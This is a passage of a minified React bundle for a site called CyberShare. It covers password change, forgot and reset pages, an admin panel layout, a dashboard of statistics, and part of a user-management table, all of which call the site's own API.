focus:ring-blue-500 focus:border-transparent",placeholder:"",required:!0}),o.jsx("button",{type:"button",onClick:()=>b(!g),className:"absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600",children:g?o.jsx(gl,{className:"h-5 w-5"}):o.jsx(kn,{className:"h-5 w-5"})})]})]}),o.jsx(Ee,{type:"submit",disabled:E,className:"w-full py-3 text-base",children:E?o.jsxs("span",{className:"flex items-center justify-center gap-2",children:[o.jsxs("svg",{className:"animate-spin h-5 w-5",viewBox:"0 0 24 24",children:[o.jsx("circle",{className:"opacity-25",cx:"12",cy:"12",r:"10",stroke:"currentColor",strokeWidth:"4",fill:"none"}),o.jsx("path",{className:"opacity-75",fill:"currentColor",d:"M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"})]}),"Changing..."]}):"Change Password"})]}),o.jsx("div",{className:"mt-6 text-center",children:o.jsxs("p",{className:"text-sm text-gray-500",children:["Forgot your current password?"," ",o.jsx(we,{to:"/forgot-password",className:"text-blue-600 hover:text-blue-800 font-medium",children:"Reset it here"})]})})]})]})})}function s7(){const[e,t]=j.useState(""),[n,r]=j.useState(!1),[a,l]=j.useState(!1),[u,f]=j.useState(""),h=async m=>{var x,g;m.preventDefault(),f(""),r(!0);try{await _e.post("/api/password/forgot",{email:e}),l(!0)}catch(b){f(((g=(x=b.response)==null?void 0:x.data)==null?void 0:g.message)||"Failed to send reset email. Please try again.")}finally{r(!1)}};return a?o.jsx("div",{className:"min-h-screen bg-gray-50 flex items-center justify-center p-4",children:o.jsx("div",{className:"w-full max-w-md",children:o.jsxs("div",{className:"bg-white rounded-2xl shadow-xl p-8 text-center",children:[o.jsx("div",{className:"inline-flex items-center justify-center w-16 h-16 bg-green-100 rounded-full mb-6",children:o.jsx(Iu,{className:"h-8 w-8 text-green-600"})}),o.jsx("h1",{className:"text-2xl font-bold text-gray-900 mb-4",children:"Check Your Email"}),o.jsxs("p",{className:"text-gray-600 mb-6",children:["If an account exists for ",o.jsx("strong",{children:e}),", we've sent a password reset link. The link will expire in 24 hours."]}),o.jsx("p",{className:"text-sm text-gray-500 mb-6",children:"Don't see the email? Check your spam folder."}),o.jsxs("div",{className:"space-y-3",children:[o.jsx(Ee,{onClick:()=>{l(!1),t("")},variant:"outline",className:"w-full",children:"Send Another Email"}),o.jsx(we,{to:"/login",children:o.jsx(Ee,{className:"w-full",children:"Back to Login"})})]})]})})}):o.jsx("div",{className:"min-h-screen bg-gray-50 py-12 px-4",children:o.jsxs("div",{className:"max-w-md mx-auto",children:[o.jsxs(we,{to:"/login",className:"inline-flex items-center gap-2 text-gray-600 hover:text-gray-900 mb-8 transition-colors",children:[o.jsx(Fi,{className:"h-4 w-4"}),"Back to Login"]}),o.jsxs("div",{className:"bg-white rounded-2xl shadow-xl p-8",children:[o.jsxs("div",{className:"text-center mb-8",children:[o.jsx("div",{className:"inline-flex items-center justify-center w-16 h-16 bg-blue-100 rounded-full mb-4",children:o.jsx(Nl,{className:"h-8 w-8 text-blue-600"})}),o.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"Forgot Password?"}),o.jsx("p",{className:"text-gray-500 mt-2",children:"No worries! Enter your email and we'll send you a reset link."})]}),u&&o.jsxs("div",{className:"mb-6 p-4 bg-red-50 border border-red-200 rounded-lg flex items-center gap-3 text-red-700",children:[o.jsx(Xu,{className:"h-5 w-5 flex-shrink-0"}),o.jsx("span",{className:"text-sm",children:u})]}),o.jsxs("form",{onSubmit:h,className:"space-y-5",children:[o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Email Address"}),o.jsxs("div",{className:"relative",children:[o.jsx(Nl,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400"}),o.jsx("input",{type:"email",value:e,onChange:m=>t(m.target.value),className:"w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent",placeholder:"Enter your email",required:!0})]})]}),o.jsx(Ee,{type:"submit",disabled:n,className:"w-full py-3 text-base",children:n?o.jsxs("span",{className:"flex items-center justify-center gap-2",children:[o.jsxs("svg",{className:"animate-spin h-5 w-5",viewBox:"0 0 24 24",children:[o.jsx("circle",{className:"opacity-25",cx:"12",cy:"12",r:"10",stroke:"currentColor",strokeWidth:"4",fill:"none"}),o.jsx("path",{className:"opacity-75",fill:"currentColor",d:"M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"})]}),"Sending..."]}):"Send Reset Link"})]}),o.jsx("div",{className:"mt-6 text-center",children:o.jsxs("p",{className:"text-sm text-gray-500",children:["Remember your password?"," ",o.jsx(we,{to:"/login",className:"text-blue-600 hover:text-blue-800 font-medium",children:"Sign in"})]})})]})]})})}function l7(){const e=Ln(),[t]=Qu(),n=t.get("token"),[r,a]=j.useState(""),[l,u]=j.useState(""),[f,h]=j.useState(!1),[m,x]=j.useState(!1),[g,b]=j.useState(!1),[E,C]=j.useState(!0),[P,O]=j.useState(!1),[N,T]=j.useState(!1),[A,_]=j.useState("");j.useEffect(()=>{(async()=>{if(!n){O(!1),C(!1);return}try{const B=await _e.get(`/api/password/reset/validate?token=${n}`);O(B.data.valid)}catch{O(!1)}finally{C(!1)}})()},[n]);const M=async R=>{var B,U;if(R.preventDefault(),_(""),r!==l){_("Passwords do not match");return}if(r.length<6){_("Password must be at least 6 characters");return}b(!0);try{await _e.post("/api/password/reset",{token:n,newPassword:r}),T(!0)}catch($){_(((U=(B=$.response)==null?void 0:B.data)==null?void 0:U.message)||"Failed to reset password. Please try again.")}finally{b(!1)}};return E?o.jsx("div",{className:"min-h-screen bg-gray-50 flex items-center justify-center p-4",children:o.jsx("div",{className:"w-full max-w-md",children:o.jsxs("div",{className:"bg-white rounded-2xl shadow-xl p-8 text-center",children:[o.jsx("div",{className:"inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mb-6"}),o.jsx("h1",{className:"text-xl font-bold text-gray-900",children:"Validating Reset Link..."}),o.jsx("p",{className:"text-gray-500 mt-2",children:"Please wait while we verify your reset link."})]})})}):P?N?o.jsx("div",{className:"min-h-screen bg-gray-50 flex items-center justify-center p-4",children:o.jsx("div",{className:"w-full max-w-md",children:o.jsxs("div",{className:"bg-white rounded-2xl shadow-xl p-8 text-center",children:[o.jsx("div",{className:"inline-flex items-center justify-center w-16 h-16 bg-green-100 rounded-full mb-6",children:o.jsx(Iu,{className:"h-8 w-8 text-green-600"})}),o.jsx("h1",{className:"text-2xl font-bold text-gray-900 mb-4",children:"Password Reset!"}),o.jsx("p",{className:"text-gray-600 mb-6",children:"Your password has been reset successfully. You can now sign in with your new password."}),o.jsx(Ee,{onClick:()=>e("/login"),className:"w-full",children:"Sign In"})]})})}):o.jsx("div",{className:"min-h-screen bg-gray-50 py-12 px-4",children:o.jsxs("div",{className:"max-w-md mx-auto",children:[o.jsxs(we,{to:"/login",className:"inline-flex items-center gap-2 text-gray-600 hover:text-gray-900 mb-8 transition-colors",children:[o.jsx(Fi,{className:"h-4 w-4"}),"Back to Login"]}),o.jsxs("div",{className:"bg-white rounded-2xl shadow-xl p-8",children:[o.jsxs("div",{className:"text-center mb-8",children:[o.jsx("div",{className:"inline-flex items-center justify-center w-16 h-16 bg-blue-100 rounded-full mb-4",children:o.jsx(ga,{className:"h-8 w-8 text-blue-600"})}),o.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"Reset Password"}),o.jsx("p",{className:"text-gray-500 mt-2",children:"Enter your new password below."})]}),A&&o.jsxs("div",{className:"mb-6 p-4 bg-red-50 border border-red-200 rounded-lg flex items-center gap-3 text-red-700",children:[o.jsx(Xu,{className:"h-5 w-5 flex-shrink-0"}),o.jsx("span",{className:"text-sm",children:A})]}),o.jsxs("form",{onSubmit:M,className:"space-y-5",children:[o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"New Password"}),o.jsxs("div",{className:"relative",children:[o.jsx(ga,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400"}),o.jsx("input",{type:f?"text":"password",value:r,onChange:R=>a(R.target.value),className:"w-full pl-10 pr-12 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent",placeholder:"",required:!0,minLength:6}),o.jsx("button",{type:"button",onClick:()=>h(!f),className:"absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600",children:f?o.jsx(gl,{className:"h-5 w-5"}):o.jsx(kn,{className:"h-5 w-5"})})]}),o.jsx("p",{className:"text-xs text-gray-500 mt-1",children:"Must be at least 6 characters"})]}),o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Confirm New Password"}),o.jsxs("div",{className:"relative",children:[o.jsx(ga,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400"}),o.jsx("input",{type:m?"text":"password",value:l,onChange:R=>u(R.target.value),className:"w-full pl-10 pr-12 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent",placeholder:"",required:!0}),o.jsx("button",{type:"button",onClick:()=>x(!m),className:"absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600",children:m?o.jsx(gl,{className:"h-5 w-5"}):o.jsx(kn,{className:"h-5 w-5"})})]})]}),o.jsx(Ee,{type:"submit",disabled:g,className:"w-full py-3 text-base",children:g?o.jsxs("span",{className:"flex items-center justify-center gap-2",children:[o.jsxs("svg",{className:"animate-spin h-5 w-5",viewBox:"0 0 24 24",children:[o.jsx("circle",{className:"opacity-25",cx:"12",cy:"12",r:"10",stroke:"currentColor",strokeWidth:"4",fill:"none"}),o.jsx("path",{className:"opacity-75",fill:"currentColor",d:"M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"})]}),"Resetting..."]}):"Reset Password"})]})]})]})}):o.jsx("div",{className:"min-h-screen bg-gray-50 flex items-center justify-center p-4",children:o.jsx("div",{className:"w-full max-w-md",children:o.jsxs("div",{className:"bg-white rounded-2xl shadow-xl p-8 text-center",children:[o.jsx("div",{className:"inline-flex items-center justify-center w-16 h-16 bg-red-100 rounded-full mb-6",children:o.jsx(C_,{className:"h-8 w-8 text-red-600"})}),o.jsx("h1",{className:"text-2xl font-bold text-gray-900 mb-4",children:"Invalid or Expired Link"}),o.jsx("p",{className:"text-gray-600 mb-6",children:"This password reset link is invalid or has expired. Please request a new one."}),o.jsxs("div",{className:"space-y-3",children:[o.jsx(we,{to:"/forgot-password",children:o.jsx(Ee,{className:"w-full",children:"Request New Link"})}),o.jsx(we,{to:"/login",children:o.jsx(Ee,{variant:"outline",className:"w-full",children:"Back to Login"})})]})]})})})}const o7=[{title:"Dashboard",icon:x_,path:"/admin"},{title:"Users",icon:Mi,path:"/admin/users"},{title:"Posts",icon:Xr,path:"/admin/posts"},{title:"Categories",icon:y0,path:"/admin/categories"},{title:"Tags",icon:wk,path:"/admin/tags"},{title:"Analytics",icon:yk,path:"/admin/analytics"},{title:"Settings",icon:ec,path:"/admin/settings"}];function u7(){const{user:e,logout:t}=Gt(),n=Or(),r=Ln(),[a,l]=j.useState(!0),[u,f]=j.useState(!1);if(!e||e.role!=="ADMIN")return o.jsx("div",{className:"min-h-screen bg-gray-100 flex items-center justify-center",children:o.jsxs("div",{className:"bg-white p-8 rounded-lg shadow-lg text-center max-w-md",children:[o.jsx(Da,{className:"h-16 w-16 text-red-500 mx-auto mb-4"}),o.jsx("h1",{className:"text-2xl font-bold text-gray-900 mb-2",children:"Access Denied"}),o.jsx("p",{className:"text-gray-600 mb-6",children:"You need administrator privileges to access this area."}),o.jsxs(we,{to:"/",className:"inline-flex items-center gap-2 bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 transition-colors",children:[o.jsx(v0,{className:"h-4 w-4"}),"Back to Home"]})]})});const h=()=>{t(),r("/")};return o.jsxs("div",{className:"min-h-screen bg-gray-100",children:[o.jsxs("aside",{className:`fixed inset-y-0 left-0 z-50 w-64 bg-gray-900 transform transition-transform duration-300 ease-in-out ${a?"translate-x-0":"-translate-x-full"} lg:translate-x-0`,children:[o.jsxs("div",{className:"h-16 flex items-center justify-between px-6 border-b border-gray-800",children:[o.jsxs(we,{to:"/admin",className:"flex items-center gap-2",children:[o.jsx(Da,{className:"h-8 w-8 text-blue-500"}),o.jsx("span",{className:"text-xl font-bold text-white",children:"CyberShare"})]}),o.jsx("button",{onClick:()=>l(!1),className:"lg:hidden text-gray-400 hover:text-white",children:o.jsx(Bi,{className:"h-6 w-6"})})]}),o.jsx("nav",{className:"mt-6 px-3",children:o7.map(m=>{const x=n.pathname===m.path;return o.jsxs(we,{to:m.path,className:`flex items-center gap-3 px-4 py-3 rounded-lg mb-1 transition-colors ${x?"bg-blue-600 text-white":"text-gray-400 hover:bg-gray-800 hover:text-white"}`,children:[o.jsx(m.icon,{className:"h-5 w-5"}),o.jsx("span",{className:"font-medium",children:m.title})]},m.path)})}),o.jsx("div",{className:"absolute bottom-0 left-0 right-0 p-4 border-t border-gray-800",children:o.jsxs(we,{to:"/",className:"flex items-center gap-3 px-4 py-3 rounded-lg text-gray-400 hover:bg-gray-800 hover:text-white transition-colors",children:[o.jsx(v0,{className:"h-5 w-5"}),o.jsx("span",{className:"font-medium",children:"Back to Site"})]})})]}),o.jsxs("div",{className:`${a?"lg:ml-64":""} transition-all duration-300`,children:[o.jsxs("header",{className:"h-16 bg-white shadow-sm flex items-center justify-between px-6 sticky top-0 z-40",children:[o.jsxs("div",{className:"flex items-center gap-4",children:[o.jsx("button",{onClick:()=>l(!a),className:"text-gray-600 hover:text-gray-900",children:o.jsx(Ek,{className:"h-6 w-6"})}),o.jsx("h1",{className:"text-lg font-semibold text-gray-900",children:"Admin Panel"})]}),o.jsxs("div",{className:"flex items-center gap-4",children:[o.jsxs("button",{className:"relative p-2 text-gray-600 hover:text-gray-900 hover:bg-gray-100 rounded-full",children:[o.jsx(qg,{className:"h-5 w-5"}),o.jsx("span",{className:"absolute top-1 right-1 h-2 w-2 bg-red-500 rounded-full"})]}),o.jsxs("div",{className:"relative",children:[o.jsxs("button",{onClick:()=>f(!u),className:"flex items-center gap-3 hover:bg-gray-100 rounded-lg px-3 py-2 transition-colors",children:[o.jsx("img",{src:e.avatarUrl||`https://ui-avatars.com/api/?name=${e.username}`,alt:e.username,className:"h-8 w-8 rounded-full"}),o.jsxs("div",{className:"hidden md:block text-left",children:[o.jsx("p",{className:"text-sm font-medium text-gray-900",children:e.displayName||e.username}),o.jsx("p",{className:"text-xs text-gray-500",children:"Administrator"})]}),o.jsx(u_,{className:"h-4 w-4 text-gray-500"})]}),u&&o.jsxs(o.Fragment,{children:[o.jsx("div",{className:"fixed inset-0 z-10",onClick:()=>f(!1)}),o.jsxs("div",{className:"absolute right-0 mt-2 w-48 bg-white rounded-lg shadow-lg border border-gray-200 py-1 z-20",children:[o.jsx(we,{to:"/profile",className:"block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100",onClick:()=>f(!1),children:"Your Profile"}),o.jsx(we,{to:"/admin/settings",className:"block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100",onClick:()=>f(!1),children:"Settings"}),o.jsx("hr",{className:"my-1"}),o.jsxs("button",{onClick:h,className:"w-full text-left px-4 py-2 text-sm text-red-600 hover:bg-gray-100 flex items-center gap-2",children:[o.jsx(bk,{className:"h-4 w-4"}),"Sign out"]})]})]})]})]})]}),o.jsx("main",{className:"p-6",children:o.jsx(Qw,{})})]}),a&&o.jsx("div",{className:"fixed inset-0 bg-black bg-opacity-50 z-40 lg:hidden",onClick:()=>l(!1)})]})}function c7(){const[e,t]=j.useState(null),[n,r]=j.useState([]),[a,l]=j.useState([]),[u,f]=j.useState(!0),[h,m]=j.useState(null);j.useEffect(()=>{x()},[]);const x=async()=>{var E,C;try{f(!0);const[P,O,N]=await Promise.all([_e.get("/api/admin/statistics"),_e.get("/api/admin/users?page=0&size=5&sort=createdAt,desc"),_e.get("/api/admin/posts/pending?page=0&size=5")]);t(P.data),r(O.data.content||[]),l(N.data.content||[])}catch(P){m(((C=(E=P.response)==null?void 0:E.data)==null?void 0:C.message)||"Failed to load dashboard data")}finally{f(!1)}};if(u)return o.jsx("div",{className:"flex items-center justify-center h-64",children:o.jsx("div",{className:"animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"})});if(h)return o.jsxs("div",{className:"bg-red-50 border border-red-200 rounded-lg p-6 text-center",children:[o.jsx(Xu,{className:"h-12 w-12 text-red-500 mx-auto mb-4"}),o.jsx("h2",{className:"text-lg font-semibold text-red-800",children:h})]});const g=[{title:"Total Users",value:(e==null?void 0:e.totalUsers)||0,change:(e==null?void 0:e.newUsersThisWeek)||0,changeLabel:"this week",icon:Mi,color:"blue",link:"/admin/users"},{title:"Total Posts",value:(e==null?void 0:e.totalPosts)||0,change:(e==null?void 0:e.newPostsThisWeek)||0,changeLabel:"this week",icon:Xr,color:"green",link:"/admin/posts"},{title:"Total Views",value:(e==null?void 0:e.totalViews)||0,change:null,icon:kn,color:"purple",link:"/admin/analytics"},{title:"Total Likes",value:(e==null?void 0:e.totalLikes)||0,change:null,icon:cr,color:"red",link:"/admin/analytics"},{title:"Comments",value:(e==null?void 0:e.totalComments)||0,change:null,icon:Ju,color:"yellow",link:"/admin/analytics"},{title:"Pending Review",value:(e==null?void 0:e.pendingPosts)||0,change:null,icon:Yg,color:"orange",link:"/admin/posts?status=pending"}],b={blue:"bg-blue-50 text-blue-600 border-blue-200",green:"bg-green-50 text-green-600 border-green-200",purple:"bg-purple-50 text-purple-600 border-purple-200",red:"bg-red-50 text-red-600 border-red-200",yellow:"bg-yellow-50 text-yellow-600 border-yellow-200",orange:"bg-orange-50 text-orange-600 border-orange-200"};return o.jsxs("div",{className:"space-y-6",children:[o.jsxs("div",{children:[o.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"Dashboard"}),o.jsx("p",{className:"text-gray-500 mt-1",children:"Welcome back! Here's what's happening with CyberShare."})]}),o.jsx("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-6 gap-4",children:g.map((E,C)=>o.jsxs(we,{to:E.link,className:"bg-white rounded-xl border border-gray-200 p-5 hover:shadow-lg transition-shadow",children:[o.jsxs("div",{className:"flex items-center justify-between mb-3",children:[o.jsx("div",{className:`p-2 rounded-lg ${b[E.color]}`,children:o.jsx(E.icon,{className:"h-5 w-5"})}),E.change!==null&&E.change>0&&o.jsxs("span",{className:"flex items-center text-xs text-green-600 bg-green-50 px-2 py-1 rounded-full",children:[o.jsx(xk,{className:"h-3 w-3 mr-1"}),"+",E.change]})]}),o.jsx("p",{className:"text-2xl font-bold text-gray-900",children:E.value.toLocaleString()}),o.jsx("p",{className:"text-sm text-gray-500 mt-1",children:E.title})]},C))}),o.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-6",children:[o.jsxs("div",{className:"bg-white rounded-xl border border-gray-200",children:[o.jsxs("div",{className:"px-6 py-4 border-b border-gray-200 flex items-center justify-between",children:[o.jsx("h2",{className:"font-semibold text-gray-900",children:"Recent Users"}),o.jsx(we,{to:"/admin/users",className:"text-sm text-blue-600 hover:text-blue-800",children:"View all"})]}),o.jsx("div",{className:"divide-y divide-gray-100",children:n.length===0?o.jsx("div",{className:"p-6 text-center text-gray-500",children:"No users found"}):n.map(E=>o.jsxs("div",{className:"px-6 py-4 flex items-center justify-between hover:bg-gray-50",children:[o.jsxs("div",{className:"flex items-center gap-3",children:[o.jsx("img",{src:E.avatarUrl||`https://ui-avatars.com/api/?name=${E.username}`,alt:E.username,className:"h-10 w-10 rounded-full"}),o.jsxs("div",{children:[o.jsx("p",{className:"font-medium text-gray-900",children:E.displayName||E.username}),o.jsx("p",{className:"text-sm text-gray-500",children:E.email})]})]}),o.jsxs("div",{className:"text-right",children:[o.jsx("span",{className:`inline-flex px-2 py-1 text-xs font-medium rounded-full ${E.status==="ACTIVE"?"bg-green-100 text-green-700":E.status==="BANNED"?"bg-red-100 text-red-700":"bg-gray-100 text-gray-700"}`,children:E.status}),o.jsx("p",{className:"text-xs text-gray-400 mt-1",children:new Date(E.createdAt).toLocaleDateString()})]})]},E.id))})]}),o.jsxs("div",{className:"bg-white rounded-xl border border-gray-200",children:[o.jsxs("div",{className:"px-6 py-4 border-b border-gray-200 flex items-center justify-between",children:[o.jsx("h2",{className:"font-semibold text-gray-900",children:"Pending Review"}),o.jsx(we,{to:"/admin/posts?status=pending",className:"text-sm text-blue-600 hover:text-blue-800",children:"View all"})]}),o.jsx("div",{className:"divide-y divide-gray-100",children:a.length===0?o.jsx("div",{className:"p-6 text-center text-gray-500",children:"No pending posts"}):a.map(E=>o.jsxs("div",{className:"px-6 py-4 hover:bg-gray-50",children:[o.jsxs("div",{className:"flex items-start justify-between",children:[o.jsxs("div",{className:"flex-1 min-w-0",children:[o.jsx("h3",{className:"font-medium text-gray-900 truncate",children:E.title}),o.jsxs("p",{className:"text-sm text-gray-500 mt-1",children:["by ",E.authorDisplayName||E.authorUsername]})]}),o.jsx(we,{to:`/admin/posts?id=${E.id}`,className:"ml-4 px-3 py-1 text-sm bg-blue-600 text-white rounded-lg hover:bg-blue-700",children:"Review"})]}),o.jsxs("p",{className:"text-xs text-gray-400 mt-2",children:["Submitted ",new Date(E.createdAt).toLocaleDateString()]})]},E.id))})]})]}),o.jsxs("div",{className:"bg-white rounded-xl border border-gray-200 p-6",children:[o.jsx("h2",{className:"font-semibold text-gray-900 mb-4",children:"Quick Actions"}),o.jsxs("div",{className:"grid grid-cols-2 md:grid-cols-4 gap-4",children:[o.jsxs(we,{to:"/admin/users",className:"flex flex-col items-center gap-2 p-4 rounded-lg border border-gray-200 hover:bg-blue-50 hover:border-blue-300 transition-colors",children:[o.jsx(Xg,{className:"h-8 w-8 text-blue-600"}),o.jsx("span",{className:"text-sm font-medium text-gray-700",children:"Manage Users"})]}),o.jsxs(we,{to:"/admin/posts?status=pending",className:"flex flex-col items-center gap-2 p-4 rounded-lg border border-gray-200 hover:bg-green-50 hover:border-green-300 transition-colors",children:[o.jsx(h_,{className:"h-8 w-8 text-green-600"}),o.jsx("span",{className:"text-sm font-medium text-gray-700",children:"Review Posts"})]}),o.jsxs(we,{to:"/admin/categories",className:"flex flex-col items-center gap-2 p-4 rounded-lg border border-gray-200 hover:bg-purple-50 hover:border-purple-300 transition-colors",children:[o.jsx(ju,{className:"h-8 w-8 text-purple-600"}),o.jsx("span",{className:"text-sm font-medium text-gray-700",children:"Categories"})]}),o.jsxs(we,{to:"/admin/analytics",className:"flex flex-col items-center gap-2 p-4 rounded-lg border border-gray-200 hover:bg-orange-50 hover:border-orange-300 transition-colors",children:[o.jsx(kn,{className:"h-8 w-8 text-orange-600"}),o.jsx("span",{className:"text-sm font-medium text-gray-700",children:"Analytics"})]})]})]})]})}function d7(){const[e,t]=j.useState([]),[n,r]=j.useState(!0),[a,l]=j.useState(0),[u,f]=j.useState(0),[h,m]=j.useState(0),[x,g]=j.useState(""),[b,E]=j.useState(""),[C,P]=j.useState(""),[O,N]=j.useState(null),[T,A]=j.useState(null);j.useEffect(()=>{_()},[a,b,C]);const _=async()=>{try{r(!0);const U=new URLSearchParams;U.append("page",a),U.append("size",15),x&&U.append("search",x),b&&U.append("status",b),C&&U.append("role",C);const $=await _e.get(`/api/admin/users?${U}`);t($.data.content||[]),f($.data.totalPages||0),m($.data.totalElements||0)}catch(U){console.error("Failed to fetch users:",U)}finally{r(!1)}},M=U=>{U.preventDefault(),l(0),_()},R=async(U,$)=>{try{A(U),await _e.put(`/api/admin/users/${U}/status`,{status:$}),_(),N(null)}catch(Y){console.error("Failed to update user status:",Y)}finally{A(null)}},B=async(U,$)=>{try{A(U),await _e.put(`/api/admin/users/${U}/role`,{role:$}),_(),N(null)}catch(Y){console.error("Failed to update user role:",Y)}finally{A(null)}};return o.jsxs("div",{className:"space-y-6",children:[o.jsxs("div",{className:"flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4",children:[o.jsxs("div",{children:[o.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"User Management"}),o.jsx("p",{className:"text-gray-500 mt-1",children:"Manage users, roles and permissions"})]}),o.jsxs("div",{className:"flex gap-2",children:[o.jsxs(Ee,{variant:"outline",size:"sm",onClick:()=>_(),children:[o.jsx(Xn,{className:"h-4 w-4 mr-2"}),"Refresh"]}),o.jsxs(Ee,{variant:"outline",size:"sm",children:[o.jsx(f_,{className:"h-4 w-4 mr-2"}),"Export"]})]})]}),o.jsx("div",{className:"bg-white rounded-xl border border-gray-200 p-4",children:o.jsxs("form",{onSubmit:M,className:"flex flex-wrap gap-4",children:[o.jsx("div",{className:"flex-1 min-w-[250px]",children:o.jsxs("div",{className:"relative",children:[o.jsx(Al,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400"}),o.jsx("input",{type:"text",placeholder:"Search by username, email or name...",value:x,onChange:U=>g(U.target.value),className:"w-full pl-10 pr-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"})]})}),o.jsxs("select",{value:b,onChange:U=>{E(U.target.value),l(0)},className:"px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 bg-white",children:[o.jsx("option",{value:"",children:"All Status"}),o.jsx("option",{value:"ACTIVE",children:"Active"}),o.jsx("option",{value:"BANNED",children:"Banned"}),o.jsx("option",{value:"INACTIVE",children:"Inactive"})]}),o.jsxs("select",{value:C,onChange:U=>{P(U.target.value),l(0)},className:"px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 bg-white",children:[o.jsx("option",{value:"",children:"All Roles"}),o.jsx("option",{value:"USER",children:"User"}),o.jsx("option",{value:"ADMIN",children:"Admin"})]}),o.jsxs(Ee,{type:"submit",children:[o.jsx(vk,{className:"h-4 w-4 mr-2"}),"Filter"]})]})}),o.jsx("div",{className:"flex items-center justify-between",children:o.jsxs("p",{className:"text-sm text-gray-500",children:["Showing ",o.jsx("span",{className:"font-medium",children:e.length})," of"," ",o.jsx("span",{className:"font-medium",children:h})," users"]})}),o.jsxs("div",{className:"bg-white rounded-xl border border-gray-200 overflow-hidden",children:[o.jsx("div",{className:"overflow-x-auto",children:o.jsxs("table",{className:"w-full",children:[o.jsx("thead",{children:o.jsxs("tr",{className:"bg-gray-50 border-b border-gray-200",children:[o.jsx("th",{className:"px-6 py-4 text-left text-xs font-semibold text-gray-600 uppercase tracking-wider",children:"User"}),o.jsx("th",{className:"px-6 py-4 text-left text-xs font-semibold text-gray-600 uppercase tracking-wider",children:"Contact"}),o.jsx("th",{className:"px-6 py-4 text-left text-xs font-semibold text-gray-600 uppercase tracking-wider",children:"Role"}),o.jsx("th",{className:"px-6 py-4 text-left text-xs font-semibold text-gray-600 uppercase tracking-wider",children:"Status"}),o.jsx("th",{className:"px-6 py-4 text-left text-xs font-semibold text-gray-600 uppercase tracking-wider",children:"Provider"}),o.jsx("th",{className:"px-6 py-4 text-left text-xs font-semibold text-gray-600 uppercase tracking-wider",children:"Joined"}),o.jsx("th",{className:"px-6 py-4 text-right text-xs font-semibold text-gray-600 uppercase tracking-wider",children:"Actions"})]})}),o.jsx("tbody",{className:"divide-y divide-gray-100",children:n?o.jsx("tr",{children:o.jsx("td",{colSpan:7,className:"px-6 py-16 text-center",children:o.jsxs("div",{className:"inline-flex items-center gap-2 text-gray-500",children:[o.jsx(Xn,{className:"h-5 w-5 animate-spin"}),"Loading users..."]})})}):e.length===0?o.jsx("tr",{children:o.jsx("td",{colSpan:7,className:"px-6 py-16 text-center text-gray-500",children:"No users found matching your criteria"})}):e.map(U=>o.jsxs("tr",{className:"hover:bg-gray-50 transition-colors",children:[o.jsx("td",{className:"px-6 py-4",children:o.jsxs(we,{to:`/author/${U.username}`,className:"flex items-center gap-3 group",children:[o.jsx("img",{src:U.avatarUrl||`https://ui-avatars.com/api/?name=${U.username}&background=random`,alt:U.username,className:"h-10 w-10 rounded-full object-cover group-hover:ring-2 group-hover:ring-blue-500 transition-all"}),o.jsxs("div",{children:[o.jsx("p",{className:"font-medium text-gray-900 group-hover:text-blue-600 transition-colors",children:U.displayName||U.username}),o.jsxs("p",{className:"text-sm text-gray-500",children:["@",U.username]})]})]})}),o.jsx("td",{className:"px-6 py-4",children:o.jsxs("div",{className:"flex items-center gap-2 text-sm text-gray-600",children:[o.jsx(Nl,{className:"h-4 w-4 text-gray-400"}),U.email,U.emailVerified&&o.jsx(Iu,{className:"h-4 w-4 text-green-500",title:"Verified"})]})}),o.jsx("td",{className:"px-6 py-4",children:o.jsxs("span",{className:`inline-flex items-center gap-1 px-2.5 py-1 text-xs font-medium rounded-full ${U.role==="ADMIN"?"bg-purple-100 text-purple-700":"bg-gray-100 text-gray-700"}`,children:[U.role==="ADMIN"&&o.jsx(Da,{className:"h-3 w-3"}),U.role]})}),o.jsx("td",{className:"px-6 py-4",children:o.jsx("span",{className:`inline-flex px-2.5 py-1 text-xs font-medium rounded-full ${U.status==="ACTIVE"?"bg-green-100 text-green-700":U.status==="BANNED"?"bg-red-100 text-red-700":"bg-gray-100 text-gray-700"}`,children:U.status})}),o.jsx("td",{className:"px-6 py-4",children:o.jsx("span",{className:"text-sm text-gray-600 